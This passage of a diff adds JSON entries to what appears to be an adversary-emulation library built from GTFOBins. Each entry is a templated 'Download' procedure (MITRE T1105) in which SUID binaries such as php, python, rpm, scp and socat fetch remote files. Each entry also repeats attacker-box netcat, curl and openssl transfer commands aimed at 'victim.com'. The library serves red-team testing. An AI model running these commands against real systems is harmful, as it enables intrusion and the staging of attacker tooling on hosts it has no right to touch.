+      "command": "echo '...' >#{lotl_gtfobins_local_path}\npandoc -L #{lotl_gtfobins_local_path} /dev/null\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pandoc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pandoc",
+        "source_bin": "pandoc",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "pandoc",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "pandoc",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pandoc:download:0:suid:0:pandoc>lua",
+        "source_name": "pandoc",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `pandoc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:download:0:suid::",
+      "name": "GTFOBINS - T1105 - php - Download - Suid [c97b729]",
+      "description": "This executable can download remote data. Binary: php. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$c=file_get_contents(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\"); file_put_contents(\"#{lotl_gtfobins_output_file}\", $c);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:download:0:suid::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:python:download:0:suid::",
+      "name": "GTFOBINS - T1105 - python - Download - Suid [f022486]",
+      "description": "This executable can download remote data. Binary: python. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", \"#{lotl_gtfobins_output_file}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/python",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/python",
+        "source_bin": "python",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:python:download:0:suid::",
+        "source_name": "python",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `python` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmdb:download:0:suid:0:rpmdb>lua",
+      "name": "GTFOBINS - T1105 - rpmdb - Download - Suid [27df529]",
+      "description": "This executable can download remote data. Binary: rpmdb. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmdb --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmdb",
+        "source_bin": "rpmdb",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmdb",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmdb",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmdb:download:0:suid:0:rpmdb>lua",
+        "source_name": "rpmdb",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmquery:download:0:suid:0:rpmquery>lua",
+      "name": "GTFOBINS - T1105 - rpmquery - Download - Suid [78e0316]",
+      "description": "This executable can download remote data. Binary: rpmquery. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmquery --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmquery",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmquery",
+        "source_bin": "rpmquery",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmquery",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmquery",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmquery:download:0:suid:0:rpmquery>lua",
+        "source_name": "rpmquery",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmquery` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmverify:download:0:suid:0:rpmverify>lua",
+      "name": "GTFOBINS - T1105 - rpmverify - Download - Suid [63c26e0]",
+      "description": "This executable can download remote data. Binary: rpmverify. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmverify --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmverify",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmverify",
+        "source_bin": "rpmverify",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmverify",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmverify",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmverify:download:0:suid:0:rpmverify>lua",
+        "source_name": "rpmverify",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmverify` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpm:download:0:suid:0:rpm>lua",
+      "name": "GTFOBINS - T1105 - rpm - Download - Suid [4cbf01a]",
+      "description": "This executable can download remote data. Binary: rpm. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpm --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpm",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpm",
+        "source_bin": "rpm",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpm",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpm",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpm:download:0:suid:0:rpm>lua",
+        "source_name": "rpm",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpm` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:scp:download:0:suid::",
+      "name": "GTFOBINS - T1105 - scp - Download - Suid [040d725]",
+      "description": "This executable can download remote data. Binary: scp. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "scp user@#{lotl_gtfobins_remote_host}:#{lotl_gtfobins_input_file} #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/scp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/scp",
+        "source_bin": "scp",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "ssh-server"
+        },
+        "operator_notes": {
+          "sender": "ssh-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:scp:download:0:suid::",
+        "source_name": "scp",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `scp` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:sftp:download:0:suid::",
+      "name": "GTFOBINS - T1105 - sftp - Download - Suid [3a8efce]",
+      "description": "This executable can download remote data. Binary: sftp. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "sftp user@#{lotl_gtfobins_remote_host}\nget #{lotl_gtfobins_input_file} #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/sftp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/sftp",
+        "source_bin": "sftp",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "ssh-server"
+        },
+        "operator_notes": {
+          "sender": "ssh-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:sftp:download:0:suid::",
+        "source_name": "sftp",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `sftp` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:socat:download:0:suid::",
+      "name": "GTFOBINS - T1105 - socat - Download - Suid [5f05a20]",
+      "description": "This executable can download remote data. Binary: socat. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "socat -u tcp-connect:#{lotl_gtfobins_remote_host}:#{lotl_gtfobins_remote_port} open:#{lotl_gtfobins_output_file},creat",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/socat",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/socat",
+        "source_bin": "socat",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
